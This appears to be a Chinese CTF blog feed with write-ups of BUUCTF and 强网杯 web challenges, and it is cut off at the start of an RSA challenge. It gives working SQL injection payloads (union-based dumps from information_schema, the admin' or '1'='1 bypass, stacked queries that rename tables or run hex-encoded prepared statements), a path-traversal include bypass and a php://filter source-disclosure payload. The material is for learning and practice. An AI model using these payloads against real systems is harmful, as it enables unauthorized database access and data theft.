    <content type="html"><![CDATA[<p>目前对于sql注入的学习还存在于简单的联合注入，本文是对注入语句的一个总结</p><span id="more"></span><h1 id="尝试语句"><a href="#尝试语句" class="headerlink" title="尝试语句"></a>尝试语句</h1><p>大部分sql语句都是</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=SELECT * <span class="keyword">FROM</span><span class="built_in"> users </span>WHERE <span class="attribute">id</span>=<span class="string">&#x27;$id&#x27;</span> </span><br></pre></td></tr></table></figure><p>这个形式只需要id=1’#  或者 id=1’–+ 或者id=1’’</p><p>对于$id,其中 ‘  是为了闭合sql语句中第一个 ‘  ，形成’1’，而#和–+是为了把后面的引号注释掉,也可以再加一个引号将其闭合</p><p>形成</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * <span class="keyword">FROM</span><span class="built_in"> users </span>WHERE <span class="attribute">id</span>=<span class="string">&#x27;1&#x27;</span>#&#x27;</span><br></pre></td></tr></table></figure><p>最终识别的就是查询id=1的内容</p><p>也可以尝试一下万能密码 </p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">admin</span><span class="string">&#x27; or &#x27;</span><span class="number">1</span><span class="string">&#x27; =  &#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p>说不定有惊喜</p><p>再这里举个例子，BUUCTF中的[极客大挑战 2019]LoveSQL</p><h1 id="爆字段数"><a href="#爆字段数" class="headerlink" title="爆字段数"></a>爆字段数</h1><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>&#x27; <span class="keyword">order</span> <span class="title">by</span> <span class="number">1</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure><p>当输入到1’ order by 4 #后报错</p><p><img src="/images/LoveSQL1.png" alt="Alt text"></p><p>说明只有3个字段数</p><h1 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h1><h2 id="回显定位"><a href="#回显定位" class="headerlink" title="回显定位"></a>回显定位</h2><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>&#x27; union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>; <span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="/images/image-20211116185553893.png" alt="Alt text"></p><p>回显定位显示再2和3上可以使用sql语句</p><h2 id="查数据库"><a href="#查数据库" class="headerlink" title="查数据库"></a>查数据库</h2><p>1’ union select 1,database(),3#</p><p><img src="/images/image-20211116185722060.png" alt="image-20211116185722060"></p><p>database()函数可以显示他依赖的数据库</p><p>或者可以查询所有的数据库名自己判断</p><figure class="highlight capnproto"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>&#x27; <span class="keyword">union</span> select <span class="number">1</span>,group_concat(schema_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.schemata<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="/images/image-20211116190234533.png" alt="image-20211116190234533"></p><h2 id="爆数据表"><a href="#爆数据表" class="headerlink" title="爆数据表"></a>爆数据表</h2><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>&#x27; <span class="built_in">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">where</span> table_schema=database()#</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>&#x27; <span class="built_in">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">where</span> table_schema=geek#</span><br></pre></td></tr></table></figure><p><img src="/images/image-20211116190401811.png" alt="image-20211116190401811"></p><p>有两个数据表</p><h2 id="爆字段"><a href="#爆字段" class="headerlink" title="爆字段"></a>爆字段</h2><p>分别对它们进行查询</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;</span>geekuser<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1&#x27;</span> union select 1,2,group_concat(column_name) <span class="keyword">from</span> information_schema.columns where <span class="attribute">table_schema</span>=database() <span class="keyword">and</span> <span class="attribute">table_name</span>=<span class="string">&#x27;l0ve1ysq1&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/images/image-20211116190739835.png" alt="image-20211116190739835"></p><p>两个都是这个</p><h2 id="爆破数据"><a href="#爆破数据" class="headerlink" title="爆破数据"></a>爆破数据</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27; union select 1,2,group_concat(id,username,password) from geekuser#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1&#x27;</span> union select 1,2,group_concat(id,username,password) <span class="keyword">from</span> l0ve1ysq1#</span><br></pre></td></tr></table></figure><p>最终查询到flag在l0ve1ysq1数据表中</p><p><img src="/images/image-20211116191123002.png" alt="image-20211116191123002"></p><p>文字有点长，可以缩小屏幕或者看源代码得到flag</p><p><img src="/images/image-20211116191205681.png" alt="image-20211116191205681"></p><p>本题是作为<strong>无过滤联合查询</strong>的经典例子使用</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;目前对于sql注入的学习还存在于简单的联合注入，本文是对注入语句的一个总结&lt;/p&gt;</summary>
    
    
    
    <category term="sql注入" scheme="http://example.com/categories/sql%E6%B3%A8%E5%85%A5/"/>
    
    
  </entry>
  
  <entry>
    <title>BUU刷题日记[1]web</title>
    <link href="http://example.com/2021/09/14/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0[1]web/"/>
    <id>http://example.com/2021/09/14/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0[1]web/</id>
    <published>2021-09-14T02:24:38.000Z</published>
    <updated>2021-11-22T12:08:10.206Z</updated>
    
    <content type="html"><![CDATA[<p>1.[HCTF 2018]WarmUp<br>2.[极客大挑战 2019]EasySQL<br>3.[极客大挑战 2019]Havefun<br>4.[ACTF2020 新生赛]Include</p><span id="more"></span><h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><p>开始是个滑稽图片，访问控制台得知source.php得到源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    class emmm</span><br><span class="line">    &#123;</span><br><span class="line">        public static <span class="keyword">function</span> checkFile(&amp;<span class="variable">$page</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! isset(<span class="variable">$page</span>) || !is_string(<span class="variable">$page</span>)) &#123;</span><br><span class="line">                <span class="built_in">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="built_in">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="built_in">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);</span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="built_in">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! empty(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; is_string(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        include <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="built_in">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>在source.php中得知下一步hint.php</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag not here, and flag <span class="keyword">in</span> ffffllllaaaagggg</span><br></pre></td></tr></table></figure><p>猜测flag在ffffllllaaaagggg文件夹中</p><p>对checkFile函数加以分析</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    class emmm</span><br><span class="line">    &#123;</span><br><span class="line">        public static <span class="keyword">function</span> checkFile(&amp;<span class="variable">$page</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];    //设置白名单</span><br><span class="line">            <span class="keyword">if</span> (! isset(<span class="variable">$page</span>) || !is_string(<span class="variable">$page</span>)) &#123;                   //isset函数判断变量是否赋值，后一个函数判断是否为字符串，需满足两个条件</span><br><span class="line">                <span class="built_in">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;                          //匹配判断变量中是否含有白名单列表</span><br><span class="line">                <span class="built_in">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(               //返回page中第一个 <span class="string">&#x27;?&#x27;</span>的位置</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;                        //检查是否白名单列表</span><br><span class="line">                <span class="built_in">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);</span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(                                      //返回_page中第一个<span class="string">&#x27;?&#x27;</span>的位置</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;                        //检查是否白名单列表</span><br><span class="line">                <span class="built_in">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>对source.php中flag产生的条件进行分析</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> (! empty(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])                             </span><br><span class="line">        &amp;&amp; is_string(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])                                 </span><br><span class="line">    ) &#123;</span><br><span class="line">        include <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="built_in">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>需要满足三个条件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file参数不为空</span><br><span class="line">file参数是一个string类型</span><br><span class="line">file参数能够通过checkFile的检验</span><br></pre></td></tr></table></figure><p>有两次问号过滤和白名单检测,<br>再利用include函数的目录跳转<br><img src="/images/BUU1.png" alt="Alt text"><br>构造payload：source.php/?file=hint.php?../../../../../../ffffllllaaaagggg</p><p>可以想象第一次过滤得到source.php，通过白名单检查，第二次过滤得到hint.php，也通过白名单检查，最终跳转读取ffffllllaaaagggg文件得到flag<br><img src="/images/BUU2.png" alt="Alt text"></p><h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><p><img src="/images/BUU3.png" alt="Alt text"></p><p>直接使用万能密码 admin’ or ‘1’ =  ‘1</p><p><img src="/images/BUU4.png" alt="Alt text"></p><p>得到flag<br>flag{d2d41481-a732-42d3-b873-77a8a25f4ff7}</p><h2 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h2><p>白给题<br>查看控制台，发现提示<br><img src="/images/BUU5.png" alt="Alt text"><br>传参后得到flag<br><img src="/images/Havefun.png" alt="Alt text"></p><h2 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h2><p>源码发现有flag.php<br><img src="/images/include1.png" alt="Alt text"></p><p>猜测为php伪协议<br>payload为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p><img src="/images/include2.png" alt="Alt text"></p><p>知识点：</p><h3 id="php-filter伪协议"><a href="#php-filter伪协议" class="headerlink" title="php://filter伪协议"></a>php://filter伪协议</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=XXX.php</span><br></pre></td></tr></table></figure><p>该伪协议读取源代码并进行base64输出，不然会当作php代码执行导致看不到源码内容</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;1.[HCTF 2018]WarmUp&lt;br&gt;2.[极客大挑战 2019]EasySQL&lt;br&gt;3.[极客大挑战 2019]Havefun&lt;br&gt;4.[ACTF2020 新生赛]Include&lt;/p&gt;</summary>
    
    
    
    <category term="BUUCTF" scheme="http://example.com/categories/BUUCTF/"/>
    
    
  </entry>
  
  <entry>
    <title>强网杯 2019_随便注</title>
    <link href="http://example.com/2021/09/14/[%E5%BC%BA%E7%BD%91%E6%9D%AF%202019]%E9%9A%8F%E4%BE%BF%E6%B3%A8/"/>
    <id>http://example.com/2021/09/14/[%E5%BC%BA%E7%BD%91%E6%9D%AF%202019]%E9%9A%8F%E4%BE%BF%E6%B3%A8/</id>
    <published>2021-09-14T02:24:38.000Z</published>
    <updated>2021-11-21T12:59:40.245Z</updated>
    
    <content type="html"><![CDATA[<p>这个题目有一点意思，单独放一个方便自己学习</p><span id="more"></span><h2 id="常规"><a href="#常规" class="headerlink" title="常规"></a>常规</h2><p>开头用万能密码试试水</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27; or &#x27;</span>1<span class="string">&#x27; = &#x27;</span>1</span><br></pre></td></tr></table></figure><p>有回显<br><img src="/images/suibian1.png" alt="suibian1"></p><p>测试字段数 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27; order by 1#</span></span><br></pre></td></tr></table></figure><p>到3的时候报错，说明字段数为2<br><img src="/images/suibian2.png" alt="Alt text"></p><p>下一步尝试union注入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27; union select 1,2#</span></span><br></pre></td></tr></table></figure><p>发现报错，并得知过滤的关键字<br><img src="/images/suibian3.png" alt="Alt text"></p><p>看了大佬博客得知用堆叠注入（通过’;’注入多条SQL语句）</p><p>先爆数据库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27;;show databases;#</span></span><br></pre></td></tr></table></figure><p><img src="/images/suibian4.png" alt="Alt text"></p><p>然后爆表</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27;;show tables;#</span></span><br></pre></td></tr></table></figure><p><img src="/images/suibian5.png" alt="Alt text"></p><p>这里有两个表<br>先尝试words表</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27;;show columns from words;#</span></span><br></pre></td></tr></table></figure><p><img src="/images/suibian6.png" alt="Alt text"></p><p>然后爆1919810931114514表<br>要注意当表名为数字的时候，需要用反引号包起来查询</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27;;show columns from `1919810931114514`;#</span></span><br></pre></td></tr></table></figure><p><img src="/images/suibian7.png" alt="Alt text"></p><p>这个时候普通方法结束了，需要整一点骚操作</p><p>在网上借鉴了大佬博客，发现有三种解题方法</p><h2 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h2><h3 id="使用rename把words表改为其他表名。"><a href="#使用rename把words表改为其他表名。" class="headerlink" title="使用rename把words表改为其他表名。"></a>使用rename把words表改为其他表名。</h3><h3 id="把1919810931114514表的名字改为words"><a href="#把1919810931114514表的名字改为words" class="headerlink" title="把1919810931114514表的名字改为words."></a>把1919810931114514表的名字改为words.</h3><h3 id="将flag名改为id"><a href="#将flag名改为id" class="headerlink" title="将flag名改为id"></a>将flag名改为id</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27; ; rename table words to word1 ; rename table `1919810931114514` to words ; alter table words change flag id varchar(100);#</span></span><br></pre></td></tr></table></figure><p><img src="/images/suibian8.png" alt="Alt text"></p><h2 id="解法2"><a href="#解法2" class="headerlink" title="解法2"></a>解法2</h2><p>因为select被过滤，将select * from <code>1919810931114514</code>进行16进制编码<br>构造payload得到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27;;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#</span></span><br></pre></td></tr></table></figure><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p>1.prepare…from…是预处理语句，会进行编码转换。<br>2.execute用来执行由SQLPrepare创建的SQL语句。<br>3.SELECT可以在一条语句里对多个变量同时赋值,而SET只能一次对一个变量赋值。</p><h2 id="解法3"><a href="#解法3" class="headerlink" title="解法3"></a>解法3</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27;; handler `1919810931114514` open as `a`; handler `a` read next;#</span></span><br></pre></td></tr></table></figure><p><code>HANDLER ... OPEN</code>语句打开一个表，使其可以使用后续<code>HANDLER ... READ</code>语句访问，该表对象未被其他会话共享，并且在会话调用<code>HANDLER ... CLOSE</code>或会话终止之前不会关闭</p><h2 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h2><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27;;show databases;# //数据库</span></span><br><span class="line"><span class="string">1&#x27;</span>;show tables;<span class="comment">#  //表名</span></span><br><span class="line">1<span class="string">&#x27;;show columns from table;#   //字段</span></span><br></pre></td></tr></table></figure><h3 id="修改表名和字段名"><a href="#修改表名和字段名" class="headerlink" title="修改表名和字段名"></a>修改表名和字段名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">//改列名</span><br><span class="line">alter table &quot; table_name&quot; change &quot; column1&quot; &quot; column2&quot; type;</span><br><span class="line"></span><br><span class="line">alter table &quot;table_name&quot; rename &quot;column1&quot; to &quot;column2&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//把table_name表下的column改名为new_column</span><br><span class="line">alter table &#x27;table_name&#x27; change &#x27;column&#x27; &#x27;new_column&#x27; type;</span><br><span class="line"></span><br><span class="line">//添加一个列</span><br><span class="line">alter table &quot; table_name&quot; add &quot; column_name&quot;  type;</span><br><span class="line"></span><br><span class="line">//删除一个列</span><br><span class="line">alter table &quot; table_name&quot; drop &quot; column_name&quot;  type;</span><br><span class="line"></span><br><span class="line">//改变列的数据类型</span><br><span class="line">alter table &quot; table_name&quot; alter column &quot; column_name&quot; type;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;这个题目有一点意思，单独放一个方便自己学习&lt;/p&gt;</summary>
    
    
    
    <category term="sql注入" scheme="http://example.com/categories/sql%E6%B3%A8%E5%85%A5/"/>
    
    
  </entry>
  
  <entry>
    <title>2021云爆杯_四校联考</title>
    <link href="http://example.com/2021/09/04/2021%E4%BA%91%E7%88%86%E6%9D%AF_%E5%9B%9B%E6%A0%A1%E8%81%94%E8%80%83/"/>
    <id>http://example.com/2021/09/04/2021%E4%BA%91%E7%88%86%E6%9D%AF_%E5%9B%9B%E6%A0%A1%E8%81%94%E8%80%83/</id>
    <published>2021-09-04T02:24:38.000Z</published>
    <updated>2022-02-11T12:56:09.490Z</updated>
    
    <content type="html"><![CDATA[<p>内部赛</p><span id="more"></span><h2 id="1-EZ-Rsa"><a href="#1-EZ-Rsa" class="headerlink" title="1.EZ_Rsa"></a>1.EZ_Rsa</h2><p>先附上原题脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">text = [<span class="string">&#x27;xxxx&#x27;</span>,<span class="string">&#x27;xxxx&#x27;</span>,<span class="string">&#x27;xxxx&#x27;</span>]</span><br><span class="line">msg1 = text[0].encode()</span><br><span class="line">msg2 = text[1].encode()</span><br><span class="line">msg3 = text[2].encode()</span><br><span class="line"></span><br><span class="line">answer = msg1 + msg2 + msg3</span><br><span class="line">flag = <span 